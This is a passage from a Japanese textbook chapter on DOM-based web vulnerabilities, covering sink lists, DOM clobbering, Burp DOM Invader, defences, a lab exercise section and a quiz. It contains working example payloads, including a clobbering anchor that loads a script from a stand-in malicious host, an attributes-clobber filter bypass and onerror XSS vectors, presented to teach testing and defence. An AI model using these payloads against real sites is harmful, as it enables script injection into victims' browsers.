FileReader.readAsArrayBuffer()
FileReader.readAsBinaryString()
FileReader.readAsDataURL()
FileReader.readAsText()
FileReader.readAsFile()
FileReader.root.getFile()
```

**対策**: 信頼できない source のデータをファイル処理 API に filename として動的に渡さない。避けられない場合は、任意ファイルアクセスを防ぐ防御（許可リスト等）をクライアントサイドに実装する。

---

## 14. DOM-based client-side SQL injection

**発生条件**（逐語）: > Client-side SQL-injection vulnerabilities arise when a script incorporates attacker-controllable data into a client-side SQL query in an unsafe way. スクリプトが攻撃者制御データを、client-side SQL クエリに安全でなく組み込むと発生する。対象はブラウザ内蔵の Web SQL Database。sink は `executeSql()`。

**被害**: 被害者が開くと、被害者ブラウザのローカル SQL データベースに任意 SQL クエリが実行される URL を作れる。DB がメッセージ等の機微データを保持するなら窃取、送信保留アクションを保持するなら改変・なりすまし操作につながる。

**対策**: 最も効果的なのは **パラメータ化クエリ（プリペアドステートメント）** を使うこと。手順は 2 段階になる。①クエリの構造を先に指定し、各ユーザー入力の位置にプレースホルダを置く。②各プレースホルダの中身を後から指定する。構造が先に確定するため、②で不正なデータが来てもクエリ構造を壊せない。`executeSql()` API では、クエリ文字列中に `?`（クエリ文字）でパラメータ化項目を指定し、各項目の値を追加パラメータで渡す。明らかに汚染されていない変数も含め、クエリに組み込む変数は**すべてパラメータ化**することが強く推奨される。

〔補足〕Web SQL Database はレガシー技術で、現在のブラウザでは廃止・非推奨化されている。

---

## 15. DOM-based HTML5-storage manipulation

**発生条件**（逐語）: > HTML5-storage manipulation vulnerabilities arise when a script stores attacker-controllable data in the HTML5 storage of the web browser (either `localStorage` or `sessionStorage`). スクリプトが攻撃者制御データをブラウザの HTML5 storage に保存すると発生する。

**リスク**: これ自体は直接の脆弱性ではないが、アプリが後でその保存データを読み戻して安全でなく処理すると、storage を経由して **DOM XSS や JavaScript injection など他の DOM ベース攻撃**を配送する踏み台になりうる（保存型 / stored DOM 脆弱性）。

**HTML5-storage manipulation sink 完全一覧（cheatsheet 逐語）**。

```text
sessionStorage.setItem()
localStorage.setItem()
```

**対策**: 信頼できない source のデータを HTML5 storage に入れない。避けられない場合はクライアントサイドで保存を防ぐ防御を実装する。

---

## 16. DOM-based client-side XPath injection

**発生条件**（逐語）: > DOM-based XPath-injection vulnerabilities arise when a script incorporates attacker-controllable data into an XPath query. スクリプトが攻撃者制御データを XPath クエリに組み込むと発生する。XPath とは、XML 文書の中から特定の要素を指定して取り出すための問い合わせ言語のこと。

**被害**: 被害者が開くと任意 XPath クエリが実行される URL を作れ、異なるデータが取得・処理される可能性がある。

**XPath injection sink 完全一覧（cheatsheet 逐語）**。

```text
document.evaluate()
element.evaluate()
```

**対策**: 信頼できない source のデータを XPath クエリに組み込まない。避けられない場合は、パース時にクエリ構造を壊す文字を含まないよう特定項目を厳格検証する。

---

## 17. DOM-based client-side JSON injection

**発生条件**（逐語）: > DOM-based JSON-injection vulnerabilities arise when a script incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application. スクリプトが攻撃者制御データを、JSON としてパースされる文字列に組み込み、それをアプリが処理すると発生する。

**Client-side JSON injection sink 完全一覧（cheatsheet 逐語）**。

```text
JSON.parse()
jQuery.parseJSON()
$.parseJSON()
```

**対策**: 信頼できない source のデータを含む文字列を JSON としてパースしない。避けられない場合は、パース時に JSON 構造を壊す文字を含まないよう特定項目を厳格検証する。

---

## 18. DOM-data manipulation

**発生条件**（逐語）: > DOM-data manipulation vulnerabilities arise when a script writes attacker-controllable data to a field within the DOM that is used within the visible UI or client-side logic. スクリプトが攻撃者制御データを、可視 UI やクライアントサイドロジックで使われる DOM のフィールドに書き込むと発生する。reflected/stored 両方で悪用可能。

**被害**: 軽度では画面の virtual defacement（テキスト/画像の改ざん）、重度では要素の `src` を改変して悪性 JavaScript を読み込ませ、意図しない動作を誘発する。原文には「**Burp の静的解析はこれを自動検出するが、実際には悪用不可の誤検知もあるため、コードと実行経路を精査せよ**」という注記がある。

**DOM-data manipulation sink 完全一覧（cheatsheet 逐語）**。

```text
script.src         script.text        script.textContent   script.innerText
element.setAttribute()  element.search  element.text        element.textContent
element.innerText  element.outerText  element.value        element.name
element.target     element.method     element.type         element.backgroundImage
element.cssText    element.codebase   document.title
document.implementation.createHTMLDocument()
history.pushState()  history.replaceState()
```

**対策**: 信頼できない source のデータを DOM データフィールドに動的に書き込まない。ユーザー入力（特に `location.search`／`location.hash`／`location.pathname` 由来）をサニタイズ・検証し、厳格な CSP で被害を緩和する。`script.src` や `setAttribute()` にユーザー制御入力を渡さない。

---

## 19. DOM-based denial of service（DoS）

**発生条件**（逐語）: > DOM-based denial-of-service vulnerabilities arise when a script passes attacker-controllable data in an unsafe way to a problematic platform API, such as an API whose invocation can cause the user's computer to consume excessive amounts of CPU or disk space. スクリプトが攻撃者制御データを、CPU やディスク容量を過剰消費させうる**問題のあるプラットフォーム API**に安全でなく渡すと発生する。副作用として、ブラウザが `localStorage` への保存拒否やビジースクリプトの強制終了などで機能制限することがある。

**Denial of service sink 完全一覧（cheatsheet 逐語）**。

```text
requestFileSystem()
RegExp()
```

**対策**: 信頼できない source のデータを問題のあるプラットフォーム API に動的に渡さない。避けられない場合はクライアントサイドで DoS を防ぐ防御を実装し、多くの場合は安全と分かる内容のみ許可する whitelist 方式で検証する。

〔補足〕`RegExp()` が sink になるのは、攻撃者が catastrophic backtracking（破滅的バックトラッキング）を起こす正規表現を注入できる場合（ReDoS, Regular expression Denial of Service）。`requestFileSystem()` は大量ディスク確保による DoS。

> ### 📌 ここは自分で開いて読んでください
> **資料**: DOM-based の各サブページ（16 カテゴリ）— 例 `https://portswigger.net/web-security/dom-based/open-redirection`, `/cookie-manipulation`, `/javascript-injection`, `/document-domain-manipulation`, `/websocket-url-poisoning`, `/link-manipulation`, `/web-message-manipulation`, `/controlling-the-web-message-source`, `/ajax-request-header-manipulation`, `/local-file-path-manipulation`, `/client-side-sql-injection`, `/html5-storage-manipulation`, `/client-side-xpath-injection`, `/client-side-json-injection`, `/dom-data-manipulation`, `/denial-of-service`
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `portswigger.net` が egress プロキシで遮断された）。本節 §6〜§19 の各定義文（arise when …）・コード例・対策は、逐語ミラー（`musclebigger/cyber-security-knowledge-engine`、`apuromafo/Academia_Backup`）から原文レベルで回収した本文にもとづく。
> **読みどころ**:
> 1. 各ページ冒頭の「発生条件（arise when …）」を原文で確認する。sink 一覧・impact の言い回しが最新か照合する。
> 2. 各ページの「How to prevent …」節。カテゴリごとに具体策（allowlist・パラメータ化・ハードコードなど）が微妙に違う。
> 3. 各ページ下部の対応ラボ。実際に手を動かせる apprentice〜practitioner の演習がある。
> **代替手段**: 全 16 サブページを 1 ファイルで原文で読める `https://raw.githubusercontent.com/musclebigger/cyber-security-knowledge-engine/main/data/knowledge-base/dom-based/README.md`。

---

## 20. DOM clobbering — XSS が使えない場面の武器

### 概要 — なぜ「clobber」するのか

DOM clobbering は、DOM XSS が塞がれている状況でも使える高度技法。原文の定義（逐語）。

> DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

要点は「**HTML フィルタが `id` や `name` 属性を許可している場面で、その属性を使って JavaScript のグローバル変数を DOM ノードで上書き（clobber）する**」こと。ブラウザは `id`/`name` を持つ要素を、同名のグローバル変数として参照できるようにする挙動があり、これを悪用する。たとえば `submit` という名前を上書きすると、フォームの本来の `submit()` 関数を妨害できる。

### 攻撃者はどこを突くか

危険なコードパターンは「グローバル変数 ‖（論理和）空オブジェクト」で初期化する書き方。脆弱コード例（逐語）。

```html
<script>
window.onload = function(){
  let someObject = window.someObject || {};
  let script = document.createElement('script');
  script.src = someObject.url;
  document.body.appendChild(script);
};
</script>
```

これを exploit する注入 HTML（逐語）。

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

仕組み（逐語要旨）: 同じ `id` を持つ 2 つのアンカーが DOM コレクションにまとめられ、`someObject` の参照がそのコレクションで上書きされる。最後のアンカーの `name=url` により `someObject.url` プロパティが外部スクリプトを指すよう clobber され、動的な `script.src` に悪性 JS が読み込まれる。

### フィルタ回避に使う attributes clobber

より巧妙なパターン。クライアント側フィルタが `form` の `attributes` を列挙してブラックリスト属性を除去しようとする実装を、`attributes` 自体を clobber して無効化する（逐語）。

```html
<form onclick=alert(1)><input id=attributes>Click me
```

仕組み（逐語要旨）: フィルタが `element.attributes.length` を条件に `for` ループで属性を除去しようとするが、`attributes` が `input` 要素で clobber されているため `input.attributes.length` が未定義になり、ループ条件（例 `i < element.attributes.length`）を満たさず属性除去が行われない。結果、`onclick` が生き残り `alert()` が実行される。

### 対策（逐語）

> * Check that objects and functions are legitimate. If you are filtering the DOM, make sure you check that the object or function is not a DOM node.
> * Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.
> * Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.

つまり、①オブジェクト/関数が正当か検査する（DOM をフィルタするなら、それが DOM ノードでないことを確認。たとえば `attributes` が本当に `NamedNodeMap` のインスタンスか検査する）。②`||` とグローバル変数を組み合わせる悪いパターンを避ける。③DOM clobbering を考慮した実績あるライブラリ（**DOMPurify**）を使う。DOMPurify とは、HTML を安全化（サニタイズ）する定番の JavaScript ライブラリのこと。

> ### 📌 ここは自分で開いて読んでください
> **資料**: DOM clobbering（PortSwigger）— https://portswigger.net/web-security/dom-based/dom-clobbering
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `portswigger.net` が egress プロキシで遮断された）。以下の記述は逐語ミラー（`musclebigger/cyber-security-knowledge-engine`）から回収した本文にもとづく。
> **読みどころ**:
> 1. アンカー 2 連による `id` clobber と `name=url` の合わせ技（本節 §20 に逐語収録）。
> 2. `attributes` clobber によるフィルタ回避の理屈。
> 3. DOMPurify を含む対策 3 点と、関連ラボ（DOM XSS via DOM clobbering 等）。
> **代替手段**: 前掲の `musclebigger` ミラー README に DOM clobbering セクションが逐語で含まれる。

---

## 21. 一覧外だが関連する 2 つのトピック

タスク上、次の 2 つも関連トピックとして挙がる。これらは PortSwigger の DOM-based トップ一覧の 16 カテゴリには**含まれていない**が、taint-flow の考え方でつながる。

〔補足（二次情報）〕
- **Form-action hijacking**: フォームの `action` 属性（DOM ベースでは `element.action` sink、§11 link manipulation の範疇）を攻撃者制御データで動的設定すると、CSRF トークンやユーザー入力を含むフォーム内容が攻撃者制御 URL に送信されてしまう。対策はフォームの action URL をハードコードするか、許可 URL の allowlist を使うこと。（出典: OWASP「Form action hijacking」）
- **Client-side HTTP parameter pollution（HPP）**: 反映されたパラメータ値の中に URL エンコードした `&` を注入し、生成されるリンクや form action の中に `&HPP_TEST`（あるいは `&amp;HPP_TEST`）が復号されて現れるかを見る手法。DOM ベース HPP は、汚染パラメータがレスポンス本文ではなく JavaScript / DOM オブジェクト内に注入され、ページ生成時に汚染された DOM/JS が作られる形で起きる。React・Angular・Vue.js のような SPA でリスクが高い。`data`／`src`／`href` 属性や form の action 内に HPP ベクタが無いか注意する。（出典: OWASP WSTG「Testing for HTTP Parameter Pollution」等の二次情報）

---

## 22. 診断ツールと共通対策

### Burp Suite スキャナと DOM Invader

DOM XSS は、数千行に及ぶ複雑な JavaScript の中を入力がどう流れるかを手で追う作業になりがちで、非常に骨が折れる。ここを自動化・可視化するのが次の 2 つ。

- **Burp Suite Web脆弱性スキャナ**: JavaScript の静的解析と動的解析を組み合わせ、DOM ベース脆弱性の検出を高信頼で自動化する。
- **DOM Invader**: Burp 内蔵ブラウザに拡張機能としてプリインストールされる、ブラウザベースの DOM XSS テストツール。既定では無効（他のテストと干渉しうるため）になっているので、使うときに有効化する。仕組みと機能は次の通り。
  - 事前定義の **canary（カナリア）文字列**（識別しやすい任意の英数字列）を各 source に注入し、DOM を自動パースして canary の出現箇所（＝到達 sink）を探す。
  - **augmented DOM view（拡張 DOM ビュー）** で、制御可能な sink を即座に特定でき、XSS の文脈と入力がどうサニタイズされているかを示す。
  - `postMessage()` で送られる web message を**ログ**でき、web message を**改変して再送**できる（web message DOM XSS のテストに使う）。

canary を source に入れて DOM をたどる、という DOM Invader の発想は、手作業のテスト手順（§4 の canary 文字列テスト）を機械化したものだと理解するとよい。

> ### 📌 ここは自分で開いて読んでください
> **資料**: DOM Invader ドキュメント（Burp Suite）— https://portswigger.net/burp/documentation/desktop/tools/dom-invader/（および `.../dom-xss`, `.../web-messages`, `.../settings`）
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `portswigger.net` が egress プロキシで遮断された）。以下の記述は WebSearch の要約と cheatsheet ミラーの記述にもとづく。
> **読みどころ**:
> 1. canary 文字列の設定と、augmented DOM view の読み方。
> 2. web message のログ表示・改変再送の操作手順（`.../web-messages`）。
> 3. DOM Invader の有効化と設定項目（`.../settings`）。既定で無効な理由も書かれている。
> **代替手段**: なし（Burp の公式ドキュメント。Burp Suite Community/Professional を導入すれば手元で実機確認できる）。

### 全カテゴリ共通の根本対策（原文逐語）

PortSwigger の「How to prevent DOM-based taint-flow vulnerabilities」全文（逐語）。

> There is no single action you can take to eliminate the threat of DOM-based attacks entirely. However, generally speaking, the most effective way to avoid DOM-based vulnerabilities is to avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink.
>
> If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code. In many cases, the relevant data can be validated on a whitelist basis, only allowing content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context into which the data is to be inserted, may involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence.

まとめると次の 3 点になる。

1. **taint-flow を断つ**: 信頼できない source のデータが、いかなる sink に渡る値も動的に変えられないようにする（これが最も効果的）。
2. **避けられないなら client 側で防御**: 多くのカテゴリで **allowlist（whitelist）による厳格な検証**が有効。sink の性質に応じて出力エンコード／パラメータ化／安全な API 選択（`innerHTML` → `textContent`、生 SQL → パラメータ化クエリ など）を組み合わせる。挿入先の文脈により、JavaScript エスケープ・HTML エンコード・URL エンコードを適切な順序で重ねる。
3. **影響緩和に CSP**: 特に XSS 系では CSP を併用して被害を抑える。

---

## 手を動かす

以下は、許可されたラボ（PortSwigger Web Security Academy）または自分で立てた検証環境でのみ行うこと。他人のサイトで無断で試してはいけない。

1. **canary で source→sink を追う**: 対象ページの検索ボックスやクエリパラメータに、`aaabbb111` のような目印文字列を入れる。ブラウザの開発者ツール（F12）を開き、Elements タブで `Ctrl+F` を押し、`aaabbb111` を DOM から検索する。**View source（ページのソース表示）ではなく Elements（DOM）を見る**のがポイント。

2. **文脈を判定する**: 目印が現れた場所の前後を見て、どんな文脈に落ちているか（`<div>aaabbb111</div>` のテキストか、`<a href="aaabbb111">` の属性値か、`<script>var x="aaabbb111"</script>` の JS 文字列か）を確認する。

3. **ブレイクアウトを試す**: 属性値なら `"` を、JS 文字列なら `";` を目印に混ぜて、その文脈から抜け出せるか検証する。抜け出せたら §4 の逐語ペイロード（`"><script>...` や `foo<img src=x onerror=...>`）を、sink の種類（`document.write` か `innerHTML` か）に合わせて選ぶ。

4. **JS 実行 sink はデバッガで追う**: 目印が DOM に現れない場合、`Ctrl+Shift+F` でページ全体の JavaScript から `location` などの source 参照を検索し、その行にブレークポイントを置いてリロードする。変数にホバーして値を確認しながら sink までの経路を追う。

5. **DOM Invader で機械化する**: Burp Suite の内蔵ブラウザを開き、設定から DOM Invader を有効化する。canary を注入させ、augmented DOM view に表示される到達 sink を確認する。web message を扱うページなら、message のログを見て改変再送を試す。

6. **対策側を確認する**: 見つけた taint-flow について、ソースを読んで「source が sink に届く前に allowlist 検証・エンコード・`textContent` 化が入っているか」を確認する。入っていなければ脆弱、入っていれば（回避可能かも含めて）安全性を評価する。

---

## つまずきポイント

- **View source で探してしまう**: DOM XSS は JavaScript が DOM を書き換えた結果として起きる。ブラウザの「ページのソースを表示」はサーバから届いた生 HTML しか見せず、JS の変更を反映しない。必ず開発者ツールの Elements（DOM 検査）で確認する。
- **`<script>` を入れれば動くと思い込む**: `innerHTML` などで後付けされた DOM の `<script>` はモダンブラウザで実行されない。`<img src=x onerror=...>` のようにイベントハンドラを使うのが定石。sink が `document.write` なら `<script>` が使える、という差を押さえる。
- **source と sink を混同する**: source は「攻撃者が値を入れる入口」（`location.search` など）、sink は「危険を引き起こす出口」（`innerHTML` など）。同じ `location` でも読み取れば source、書き込めば sink（open redirection）になる。文脈で役割が変わる。
- **origin 検証を「あるから安全」と誤認する**: web message で `indexOf`/`startsWith`/`endsWith` による部分一致検証は迂回できる。完全一致でなければ検証は意味をなさないことがある。
- **カテゴリ名に引きずられる**: 被害の種類を決めるのは sink であって、source ではない。同じ URL パラメータでも、`innerHTML` に届けば DOM XSS、`location` に届けば open redirect、`document.cookie` に届けば cookie 操作になる。
- **XSS が塞がれたら諦める**: `id`/`name` 属性の注入が許されているなら DOM clobbering が残っている。「XSS が無理でも HTML の一部を制御できる」場面を見逃さない。
- **フラグメント（`#` 以降）を軽視する**: `location.hash` は通常サーバに送られないため、サーバ側の WAF やログをすり抜けやすい。source として頻出なので必ずテストする。

---

## この節のまとめ

- DOMベース脆弱性は、サイトの JavaScript が攻撃者制御の値（source）を危険な関数（sink）に渡すことで、被害者のブラウザ内で起きる脆弱性群である。
- source から sink へ攻撃者制御データが無害化されずに流れる経路を taint-flow（汚染フロー）と呼び、これを断つのが根本対策になる。
- 代表的な source は `location`（`search`/`hash` など）・`document.cookie`・`document.referrer`・`window.name`・`localStorage`/`sessionStorage`・web message など。
- 成立する脆弱性の種類は「どの sink に届くか」で決まる。`innerHTML`/`document.write` なら DOM XSS、`location` なら open redirect、`document.cookie` なら cookie 操作、`eval` なら JavaScript injection、といった具合。
- DOM XSS のテストは canary 文字列を source に入れ、開発者ツールの DOM 検査で出現箇所と文脈を追う。View source は使えない。
- sink が `document.write` なら `<script>` が使えるが、`innerHTML` では `<img onerror>` などイベントハンドラを使う。jQuery の `attr()`/`$()` や AngularJS の `{{ }}` にも固有の注入経路がある。
- web message 経由の DOM XSS は、無検証リスナーや部分一致の origin 検証（`indexOf`/`startsWith`/`endsWith`）を突く。対策は完全一致検証と `targetOrigin` の明示。
- open redirection は正当ドメインでフィッシングを補強し、先頭を制御できれば `javascript:` で XSS に格上げされる。
- cookie 操作は session fixation や挙動改変につながり、同一親ドメイン配下の他サイトにも波及しうる。
- document-domain 操作は SOP を緩めて通常 XSS 相当の掌握を招く。子/親ドメインへの切替が抜け穴。
- JavaScript injection・WebSocket-URL poisoning・link manipulation・AJAX request-header 操作・local file-path 操作・client-side SQLi・HTML5 storage 操作・XPath injection・JSON injection・DOM-data 操作・DoS も、すべて同じ source→sink の枠組みで起きる。
- DOM clobbering は XSS が不可能でも `id`/`name` 注入でグローバル変数を上書きする技法。`||` パターンや `attributes` clobber が典型で、DOMPurify などで防ぐ。
- Burp Suite のスキャナ（静的＋動的解析）と DOM Invader（canary で sink 可視化、web message のログ/改変再送）が診断を大幅に効率化する。
- 全カテゴリ共通の対策は「信頼できない source を sink に流さない」「避けられないなら allowlist 検証・文脈別エンコード・安全な API」「影響緩和に CSP」。

---

## 理解度チェック

1. source と sink の違いを、それぞれ 1 つずつ例を挙げて説明せよ。
   - ▶ 答え: source は攻撃者が制御しうるデータの入口となる JavaScript プロパティで、例は `location.search`（クエリ文字列を読む）。sink は攻撃者データを渡すと望ましくない影響を起こす危険な関数/DOM オブジェクトで、例は `eval()`（引数を JS として実行する）や `document.body.innerHTML`（悪意ある HTML を注入されうる）。

2. 同じ `location.search` の値でも、成立する脆弱性が変わるのはなぜか。
   - ▶ 答え: 被害の種類を決めるのは「どの sink に届くか」だから。`innerHTML` に届けば DOM XSS、`location` に届けば open redirect、`document.cookie` に届けば cookie 操作になる。source ではなく sink が被害を決める。

3. DOM XSS のテストでブラウザの「ページのソースを表示（View source）」を使ってはいけないのはなぜか。
   - ▶ 答え: View source はサーバから届いた生の HTML を見せるだけで、JavaScript が実行後に書き換えた DOM を反映しないから。DOM XSS は JS の DOM 変更で起きるので、開発者ツールの Elements（DOM 検査）で確認する必要がある。

4. `innerHTML` に注入するとき `<script>alert(1)</script>` が動かないのはなぜで、代わりに何を使うか。
   - ▶ 答え: モダンブラウザは `innerHTML` で後付けされた DOM の `<script>` を実行しないから。代わりに `<img src=1 onerror=alert(1)>` のように、イベントハンドラで JS を発火させるペイロードを使う。sink が `document.write` の場合は `<script>` がそのまま使える。

5. web message を受信するリスナーの origin 検証で `if (e.origin.indexOf('normal-website.com') > -1)` が危険な理由を述べよ。
   - ▶ 答え: 部分一致だから。`http://www.normal-website.com.evil.net` のように攻撃者ドメインの中に `normal-website.com` を含めれば検証を通過する。`startsWith`/`endsWith` も同様の欠陥を持つ。origin は完全一致で検証すべき。

6. DOM-based open redirection が単なるリダイレクトより危険になり、XSS へ格上げされる条件は何か。
   - ▶ 答え: 攻撃者がリダイレクト先文字列の先頭を制御できる場合。`javascript:` 疑似プロトコルを注入すると、リダイレクトの代わりに任意 JavaScript が実行され、JavaScript injection（XSS）になる。

7. DOM clobbering はどんな場面で有効な技法か、簡潔に説明せよ。
   - ▶ 答え: DOM XSS が不可能でも、HTML フィルタが `id` や `name` 属性を許可している場面。それらの属性を持つ要素で JavaScript のグローバル変数を DOM ノードとして上書き（clobber）し、`someObject.url` のような値を攻撃者制御にして動的 `script.src` などを乗っ取る。

8. 全 DOM ベースカテゴリに共通する「最も効果的な」根本対策は何か。
   - ▶ 答え: 信頼できない source のデータが、いかなる sink に渡る値も動的に変えられないようにすること（taint-flow を断つこと）。避けられない場合は allowlist 検証・文脈別エンコード・安全な API を使い、CSP で影響を緩和する。

9. DOM Invader は何を自動化するツールか。
   - ▶ 答え: canary（目印）文字列を各 source に注入し、DOM を自動パースして canary が到達する sink とその文脈を可視化するツール。手作業の canary テストを機械化し、複雑な JavaScript の入力フロー追跡を効率化する。web message のログ表示・改変再送もできる。

---

## 出典

- https://portswigger.net/web-security/dom-based
- https://portswigger.net/web-security/cross-site-scripting/dom-based
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- https://portswigger.net/web-security/dom-based/web-message-manipulation
- https://portswigger.net/web-security/dom-based/open-redirection
- https://portswigger.net/web-security/dom-based/cookie-manipulation
- https://portswigger.net/web-security/dom-based/javascript-injection
- https://portswigger.net/web-security/dom-based/document-domain-manipulation
- https://portswigger.net/web-security/dom-based/websocket-url-poisoning
- https://portswigger.net/web-security/dom-based/link-manipulation
- https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation
- https://portswigger.net/web-security/dom-based/local-file-path-manipulation
- https://portswigger.net/web-security/dom-based/client-side-sql-injection
- https://portswigger.net/web-security/dom-based/html5-storage-manipulation
- https://portswigger.net/web-security/dom-based/client-side-xpath-injection
- https://portswigger.net/web-security/dom-based/client-side-json-injection
- https://portswigger.net/web-security/dom-based/dom-data-manipulation
- https://portswigger.net/web-security/dom-based/denial-of-service
- https://portswigger.net/burp/documentation/desktop/tools/dom-invader/
- https://raw.githubusercontent.com/Sivnerof/Sources-And-Sinks-Cheatsheet/main/README.md
- https://github.com/Sivnerof/Sources-And-Sinks-Cheatsheet
- https://github.com/musclebigger/cyber-security-knowledge-engine
- https://github.com/apuromafo/Academia_Backup
- https://github.com/frank-leitner/portswigger-websecurity-academy

<!-- sources: https://portswigger.net/web-security/dom-based, https://portswigger.net/web-security/cross-site-scripting/dom-based, https://portswigger.net/web-security/dom-based/dom-clobbering, https://portswigger.net/web-security/dom-based/controlling-the-web-message-source, https://portswigger.net/web-security/dom-based/web-message-manipulation, https://portswigger.net/web-security/dom-based/open-redirection, https://portswigger.net/web-security/dom-based/cookie-manipulation, https://portswigger.net/web-security/dom-based/javascript-injection, https://portswigger.net/web-security/dom-based/document-domain-manipulation, https://portswigger.net/web-security/dom-based/websocket-url-poisoning, https://portswigger.net/web-security/dom-based/link-manipulation, https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation, https://portswigger.net/web-security/dom-based/local-file-path-manipulation, https://portswigger.net/web-security/dom-based/client-side-sql-injection, https://portswigger.net/web-security/dom-based/html5-storage-manipulation, https://portswigger.net/web-security/dom-based/client-side-xpath-injection, https://portswigger.net/web-security/dom-based/client-side-json-injection, https://portswigger.net/web-security/dom-based/dom-data-manipulation, https://portswigger.net/web-security/dom-based/denial-of-service, https://portswigger.net/burp/documentation/desktop/tools/dom-invader/, https://raw.githubusercontent.com/Sivnerof/Sources-And-Sinks-Cheatsheet/main/README.md, https://github.com/musclebigger/cyber-security-knowledge-engine, https://github.com/apuromafo/Academia_Backup, https://github.com/frank-leitner/portswigger-websecurity-academy -->
<!-- terms: DOMベース脆弱性, DOM, source, sink, taint-flow, DOM XSS, web message, postMessage, origin検証, open redirection, cookie manipulation, session fixation, JavaScript injection, document.domain, 同一オリジンポリシー, WebSocket-URL poisoning, link manipulation, reverse tabnabbing, AJAX request-header manipulation, local file-path manipulation, client-side SQL injection, パラメータ化クエリ, HTML5-storage manipulation, XPath injection, client-side JSON injection, DOM-data manipulation, denial of service, ReDoS, DOM clobbering, DOMPurify, canary, DOM Invader, Burp Suite, CSP, allowlist -->

<!-- self-read: https://portswigger.net/web-security/dom-based | portswigger.net が egress プロキシで遮断され自動取得できず、GitHub 逐語ミラーから本文を回収した -->
<!-- self-read: https://portswigger.net/web-security/cross-site-scripting/dom-based | portswigger.net が egress プロキシで遮断され自動取得できず、GitHub 逐語ミラーから本文を回収した -->
<!-- self-read: https://portswigger.net/web-security/dom-based/open-redirection | portswigger.net が egress プロキシで遮断され自動取得できず、16サブページの本文を GitHub 逐語ミラーから回収した -->
<!-- self-read: https://portswigger.net/web-security/dom-based/dom-clobbering | portswigger.net が egress プロキシで遮断され自動取得できず、GitHub 逐語ミラーから本文を回収した -->
<!-- self-read: https://portswigger.net/burp/documentation/desktop/tools/dom-invader/ | portswigger.net が egress プロキシで遮断され自動取得できず、WebSearch 要約と cheatsheet ミラーにもとづく -->
